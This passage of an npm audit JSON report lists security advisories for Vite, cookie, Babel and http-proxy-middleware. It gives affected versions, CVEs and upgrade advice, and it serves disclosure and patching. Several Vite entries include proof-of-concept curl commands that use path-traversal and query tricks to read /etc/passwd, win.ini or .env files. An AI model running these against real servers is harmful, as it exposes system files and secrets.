      "overview": "### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n- base64 encoded content of non-allowed files is exposed using `?inline&import` (originally reported as `?import&?inline=1.wasm?init`)\n- content of non-allowed files is exposed using `?raw?import`\n\n`/@fs/` isn't needed to reproduce the issue for files inside the project root.\n\n### PoC\n\nOriginal report (check details above for simplified cases):\n\nThe ?import&?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice\n```\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n```\n\nExample full URL `http://localhost:5173/@fs/C:/windows/win.ini?import&?inline=1.wasm?init`",
      "reported_by": null,
      "title": "Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query",
      "metadata": null,
      "cves": [
        "CVE-2025-31125"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": "<4.5.11",
      "github_advisory_id": "GHSA-4r4m-qw57-chr8",
      "recommendation": "Upgrade to version 4.5.11 or later",
      "patched_versions": ">=4.5.11",
      "updated": "2025-03-31T23:32:55.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-4r4m-qw57-chr8"
    },
    "1103628": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8\n- https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949\n- https://nvd.nist.gov/vuln/detail/CVE-2025-31125\n- https://github.com/advisories/GHSA-4r4m-qw57-chr8",
      "created": "2025-03-31T17:31:54.000Z",
      "id": 1103628,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n- base64 encoded content of non-allowed files is exposed using `?inline&import` (originally reported as `?import&?inline=1.wasm?init`)\n- content of non-allowed files is exposed using `?raw?import`\n\n`/@fs/` isn't needed to reproduce the issue for files inside the project root.\n\n### PoC\n\nOriginal report (check details above for simplified cases):\n\nThe ?import&?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice\n```\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n```\n\nExample full URL `http://localhost:5173/@fs/C:/windows/win.ini?import&?inline=1.wasm?init`",
      "reported_by": null,
      "title": "Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query",
      "metadata": null,
      "cves": [
        "CVE-2025-31125"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.0.0 <5.4.16",
      "github_advisory_id": "GHSA-4r4m-qw57-chr8",
      "recommendation": "Upgrade to version 5.4.16 or later",
      "patched_versions": ">=5.4.16",
      "updated": "2025-03-31T23:32:55.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-4r4m-qw57-chr8"
    },
    "1103883": {
      "findings": [
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-32395\n- https://github.com/vitejs/vite/commit/175a83909f02d3b554452a7bd02b9f340cdfef70\n- https://github.com/advisories/GHSA-356w-63v5-8wf4",
      "created": "2025-04-11T14:06:03.000Z",
      "id": 1103883,
      "npm_advisory_id": null,
      "overview": "### Summary\nThe contents of arbitrary files can be returned to the browser if the dev server is running on Node or Bun.\n\n### Impact\nOnly apps with the following conditions are affected.\n\n- explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the Vite dev server on runtimes that are not Deno (e.g. Node, Bun)\n\n### Details\n\n[HTTP 1.1 spec (RFC 9112) does not allow `#` in `request-target`](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2). Although an attacker can send such a request. For those requests with an invalid `request-line` (it includes `request-target`), the spec [recommends to reject them with 400 or 301](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2-4). The same can be said for HTTP 2 ([ref1](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-2.4.1), [ref2](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-3), [ref3](https://datatracker.ietf.org/doc/html/rfc9113#section-8.1.1-3)).\n\nOn Node and Bun, those requests are not rejected internally and is passed to the user land. For those requests, the value of [`http.IncomingMessage.url`](https://nodejs.org/docs/latest-v22.x/api/http.html#messageurl) contains `#`. Vite assumed `req.url` won't contain `#` when checking `server.fs.deny`, allowing those kinds of requests to bypass the check.\n\nOn Deno, those requests are not rejected internally and is passed to the user land as well. But for those requests, the value of `http.IncomingMessage.url` did not contain `#`. \n\n### PoC\n```\nnpm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n```\nsend request to read `/etc/passwd`\n```\ncurl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173\n```",
      "reported_by": null,
      "title": "Vite has an `server.fs.deny` bypass with an invalid `request-target`",
      "metadata": null,
      "cves": [
        "CVE-2025-32395"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": "<4.5.13",
      "github_advisory_id": "GHSA-356w-63v5-8wf4",
      "recommendation": "Upgrade to version 4.5.13 or later",
      "patched_versions": ">=4.5.13",
      "updated": "2025-04-11T14:06:06.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-200"
      ],
      "url": "https://github.com/advisories/GHSA-356w-63v5-8wf4"
    },
    "1103884": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-32395\n- https://github.com/vitejs/vite/commit/175a83909f02d3b554452a7bd02b9f340cdfef70\n- https://github.com/advisories/GHSA-356w-63v5-8wf4",
      "created": "2025-04-11T14:06:03.000Z",
      "id": 1103884,
      "npm_advisory_id": null,
      "overview": "### Summary\nThe contents of arbitrary files can be returned to the browser if the dev server is running on Node or Bun.\n\n### Impact\nOnly apps with the following conditions are affected.\n\n- explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the Vite dev server on runtimes that are not Deno (e.g. Node, Bun)\n\n### Details\n\n[HTTP 1.1 spec (RFC 9112) does not allow `#` in `request-target`](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2). Although an attacker can send such a request. For those requests with an invalid `request-line` (it includes `request-target`), the spec [recommends to reject them with 400 or 301](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2-4). The same can be said for HTTP 2 ([ref1](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-2.4.1), [ref2](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-3), [ref3](https://datatracker.ietf.org/doc/html/rfc9113#section-8.1.1-3)).\n\nOn Node and Bun, those requests are not rejected internally and is passed to the user land. For those requests, the value of [`http.IncomingMessage.url`](https://nodejs.org/docs/latest-v22.x/api/http.html#messageurl) contains `#`. Vite assumed `req.url` won't contain `#` when checking `server.fs.deny`, allowing those kinds of requests to bypass the check.\n\nOn Deno, those requests are not rejected internally and is passed to the user land as well. But for those requests, the value of `http.IncomingMessage.url` did not contain `#`. \n\n### PoC\n```\nnpm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n```\nsend request to read `/etc/passwd`\n```\ncurl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173\n```",
      "reported_by": null,
      "title": "Vite has an `server.fs.deny` bypass with an invalid `request-target`",
      "metadata": null,
      "cves": [
        "CVE-2025-32395"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.0.0 <5.4.18",
      "github_advisory_id": "GHSA-356w-63v5-8wf4",
      "recommendation": "Upgrade to version 5.4.18 or later",
      "patched_versions": ">=5.4.18",
      "updated": "2025-04-11T14:06:06.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-200"
      ],
      "url": "https://github.com/advisories/GHSA-356w-63v5-8wf4"
    },
    "1103907": {
      "findings": [
        {
          "version": "0.5.0",
          "paths": [
            "packages__components>express>cookie"
          ]
        },
        {
          "version": "0.4.1",
          "paths": [
            "packages__server>cookie-parser>cookie"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x\n- https://github.com/jshttp/cookie/pull/167\n- https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c\n- https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
      "created": "2024-10-04T20:31:00.000Z",
      "id": 1103907,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
      "reported_by": null,
      "title": "cookie accepts cookie name, path, and domain with out of bounds characters",
      "metadata": null,
      "cves": [
        "CVE-2024-47764"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "cookie",
      "vulnerable_versions": "<0.7.0",
      "github_advisory_id": "GHSA-pxg6-pf52-xh8x",
      "recommendation": "Upgrade to version 0.7.0 or later",
      "patched_versions": ">=0.7.0",
      "updated": "2025-04-15T13:56:44.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-74"
      ],
      "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
    },
    "1104000": {
      "findings": [
        {
          "version": "7.24.0",
          "paths": [
            "packages__ui>@testing-library/jest-dom>@babel/runtime"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\n- https://github.com/babel/babel/pull/17173\n- https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-27789\n- https://github.com/advisories/GHSA-968p-4wvh-cqc8",
      "created": "2025-03-11T20:30:18.000Z",
      "id": 1104000,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",
      "reported_by": null,
      "title": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups",
      "metadata": null,
      "cves": [
        "CVE-2025-27789"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "@babel/runtime",
      "vulnerable_versions": "<7.26.10",
      "github_advisory_id": "GHSA-968p-4wvh-cqc8",
      "recommendation": "Upgrade to version 7.26.10 or later",
      "patched_versions": ">=7.26.10",
      "updated": "2025-04-16T15:39:52.000Z",
      "cvss": {
        "score": 6.2,
        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-1333"
      ],
      "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
    },
    "1104001": {
      "findings": [
        {
          "version": "7.24.0",
          "paths": [
            ".>@babel/preset-env>@babel/core>@babel/helpers"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\n- https://github.com/babel/babel/pull/17173\n- https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-27789\n- https://github.com/advisories/GHSA-968p-4wvh-cqc8",
      "created": "2025-03-11T20:30:18.000Z",
      "id": 1104001,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",
      "reported_by": null,
      "title": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups",
      "metadata": null,
      "cves": [
        "CVE-2025-27789"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "@babel/helpers",
      "vulnerable_versions": "<7.26.10",
      "github_advisory_id": "GHSA-968p-4wvh-cqc8",
      "recommendation": "Upgrade to version 7.26.10 or later",
      "patched_versions": ">=7.26.10",
      "updated": "2025-04-16T15:39:52.000Z",
      "cvss": {
        "score": 6.2,
        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-1333"
      ],
      "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
    },
    "1104109": {
      "findings": [
        {
          "version": "3.0.3",
          "paths": [
            "packages__ui>react-scripts>webpack-dev-server>http-proxy-middleware"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-32997\n- https://github.com/chimurai/http-proxy-middleware/pull/1096\n- https://github.com/chimurai/http-proxy-middleware/commit/1bdccbeec243850f1d2bb50ea0ff2151e725d67e\n- https://github.com/chimurai/http-proxy-middleware/releases/tag/v2.0.9\n- https://github.com/chimurai/http-proxy-middleware/releases/tag/v3.0.5\n- https://github.com/advisories/GHSA-9gqv-wp59-fq42",
      "created": "2025-04-15T03:30:34.000Z",
      "id": 1104109,
      "npm_advisory_id": null,
      "overview": "In http-proxy-middleware before 2.0.9 and 3.x before 3.0.5, fixRequestBody proceeds even if bodyParser has failed.",
      "reported_by": null,
      "title": "http-proxy-middleware allows fixRequestBody to proceed even if bodyParser has failed",
      "metadata": null,
      "cves": [
        "CVE-2025-32997"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "http-proxy-middleware",
      "vulnerable_versions": ">=3.0.0 <3.0.5",
      "github_advisory_id": "GHSA-9gqv-wp59-fq42",
      "recommendation": "Upgrade to version 3.0.5 or later",
      "patched_versions": ">=3.0.5",
      "updated": "2025-04-28T14:28:54.000Z",
      "cvss": {
        "score": 4,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N"
      },
      "cwe": [
        "CWE-754"
      ],
      "url": "https://github.com/advisories/GHSA-9gqv-wp59-fq42"
    },
    "1104110": {
      "findings": [
        {
          "version": "3.0.3",
          "paths": [
            "packages__ui>react-scripts>webpack-dev-server>http-proxy-middleware"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-32996\n- https://github.com/chimurai/http-proxy-middleware/pull/1089\n- https://github.com/chimurai/http-proxy-middleware/commit/020976044d113fc0bcbbaf995e91d05e2829a145\n- https://github.com/chimurai/http-proxy-middleware/releases/tag/v2.0.8\n- https://github.com/chimurai/http-proxy-middleware/releases/tag/v3.0.4\n- https://github.com/advisories/GHSA-4www-5p9h-95mh",
      "created": "2025-04-15T03:30:34.000Z",
      "id": 1104110,
      "npm_advisory_id": null,
      "overview": "In http-proxy-middleware before 2.0.8 and 3.x before 3.0.4, writeBody can be called twice because \"else if\" is not used.",
      "reported_by": null,
      "title": "http-proxy-middleware can call writeBody twice because \"else if\" is not used",
      "metadata": null,
      "cves": [
        "CVE-2025-32996"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "http-proxy-middleware",
      "vulnerable_versions": ">=3.0.0 <3.0.4",
      "github_advisory_id": "GHSA-4www-5p9h-95mh",
      "recommendation": "Upgrade to version 3.0.4 or later",
      "patched_versions": ">=3.0.4",
      "updated": "2025-04-28T14:27:15.000Z",
      "cvss": {
        "score": 4,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:N/A:L"
      },
      "cwe": [
        "CWE-670"
      ],
      "url": "https://github.com/advisories/GHSA-4www-5p9h-95mh"
    },
    "1104172": {
      "findings": [
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-859w-5945-r5v3\n- https://github.com/vitejs/vite/commit/c22c43de612eebb6c182dd67850c24e4fab8cacb\n- https://nvd.nist.gov/vuln/detail/CVE-2025-46565\n- https://github.com/advisories/GHSA-859w-5945-r5v3",
      "created": "2025-04-30T17:40:27.000Z",
      "id": 1104172,
      "npm_advisory_id": null,
      "overview": "### Summary\nThe contents of files in [the project `root`](https://vite.dev/config/shared-options.html#root) that are denied by a file matching pattern can be returned to the browser.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\nOnly files that are under [project `root`](https://vite.dev/config/shared-options.html#root) and are denied by a file matching pattern can be bypassed.\n\n- Examples of file matching patterns: `.env`, `.env.*`, `*.{crt,pem}`, `**/.env`\n- Examples of other patterns: `**/.git/**`, `.git/**`, `.git/**/*`\n\n### Details\n[`server.fs.deny`](https://vite.dev/config/server-options.html#server-fs-deny) can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns).\nThese patterns were able to bypass for files under `root` by using a combination of slash and dot (`/.`).\n\n### PoC\n```\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env/. http://localhost:5173\n```\n\n![image](https://github.com/user-attachments/assets/822f4416-aa42-461f-8c95-a88d155e674b)\n![image](https://github.com/user-attachments/assets/42902144-863a-4afb-ac5b-fc16effa37cc)",
      "reported_by": null,
      "title": "Vite's server.fs.deny bypassed with /. for files under project root",
      "metadata": null,
      "cves": [
        "CVE-2025-46565"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": "<=4.5.13",
      "github_advisory_id": "GHSA-859w-5945-r5v3",
      "recommendation": "Upgrade to version 4.5.14 or later",
      "patched_versions": ">=4.5.14",
      "updated": "2025-05-02T15:33:48.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-22"
      ],
      "url": "https://github.com/advisories/GHSA-859w-5945-r5v3"
    },
    "1104173": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-859w-5945-r5v3\n- https://github.com/vitejs/vite/commit/c22c43de612eebb6c182dd67850c24e4fab8cacb\n- https://nvd.nist.gov/vuln/detail/CVE-2025-46565\n- https://github.com/advisories/GHSA-859w-5945-r5v3",
      "created": "2025-04-30T17:40:27.000Z",
      "id": 1104173,
      "npm_advisory_id": null,
      "overview": "### Summary\nThe contents of files in [the project `root`](https://vite.dev/config/shared-options.html#root) that are denied by a file matching pattern can be returned to the browser.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\nOnly files that are under [project `root`](https://vite.dev/config/shared-options.html#root) and are denied by a file matching pattern can be bypassed.\n\n- Examples of file matching patterns: `.env`, `.env.*`, `*.{crt,pem}`, `**/.env`\n- Examples of other patterns: `**/.git/**`, `.git/**`, `.git/**/*`\n\n### Details\n[`server.fs.deny`](https://vite.dev/config/server-options.html#server-fs-deny) can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns).\nThese patterns were able to bypass for files under `root` by using a combination of slash and dot (`/.`).\n\n### PoC\n```\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env/. http://localhost:5173\n```\n\n![image](https://github.com/user-attachments/assets/822f4416-aa42-461f-8c95-a88d155e674b)\n![image](https://github.com/user-attachments/assets/42902144-863a-4afb-ac5b-fc16effa37cc)",
      "reported_by": null,
      "title": "Vite's server.fs.deny bypassed with /. for files under project root",
      "metadata": null,
      "cves": [
        "CVE-2025-46565"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.0.0 <=5.4.18",
      "github_advisory_id": "GHSA-859w-5945-r5v3",
      "recommendation": "Upgrade to version 5.4.19 or later",
      "patched_versions": ">=5.4.19",
      "updated": "2025-05-02T15:33:48.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-22"
      ],
      "url": "https://github.com/advisories/GHSA-859w-5945-r5v3"
    },
    "1104201": {
      "findings": [
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\n- https://nvd.nist.gov/vuln/detail/CVE-2025-31486\n- https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\n- https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\n- https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
      "created": "2025-04-04T14:20:05.000Z",
      "id": 1104201,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n#### `.svg`\n\nRequests ending with `.svg` are loaded at this line.\nhttps://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\nBy adding `?.svg` with `?.wasm?init` or with `sec-fetch-dest: script` header, the restriction was able to bypass.\n\nThis bypass is only possible if the file is smaller than [`build.assetsInlineLimit`](https://vite.dev/config/build-options.html#build-assetsinlinelimit) (default: 4kB) and when using Vite 6.0+.\n\n#### relative paths\n\nThe check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. `../../`).\n\n### PoC\n\n```bash\nnpm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n```\n\nsend request to read `etc/passwd`\n\n```bash\ncurl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n```\n\n```bash\ncurl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?raw'\n```",
      "reported_by": null,
      "title": "Vite allows server.fs.deny to be bypassed with .svg or relative paths",
      "metadata": null,
      "cves": [
        "CVE-2025-31486"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": "<4.5.12",
      "github_advisory_id": "GHSA-xcj6-pq6g-qj4x",
      "recommendation": "Upgrade to version 4.5.12 or later",
      "patched_versions": ">=4.5.12",
      "updated": "2025-04-30T17:26:54.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
    },
    "1104202": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x\n- https://nvd.nist.gov/vuln/detail/CVE-2025-31486\n- https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647\n- https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\n- https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
      "created": "2025-04-04T14:20:05.000Z",
      "id": 1104202,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n#### `.svg`\n\nRequests ending with `.svg` are loaded at this line.\nhttps://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\nBy adding `?.svg` with `?.wasm?init` or with `sec-fetch-dest: script` header, the restriction was able to bypass.\n\nThis bypass is only possible if the file is smaller than [`build.assetsInlineLimit`](https://vite.dev/config/build-options.html#build-assetsinlinelimit) (default: 4kB) and when using Vite 6.0+.\n\n#### relative paths\n\nThe check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. `../../`).\n\n### PoC\n\n```bash\nnpm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n```\n\nsend request to read `etc/passwd`\n\n```bash\ncurl 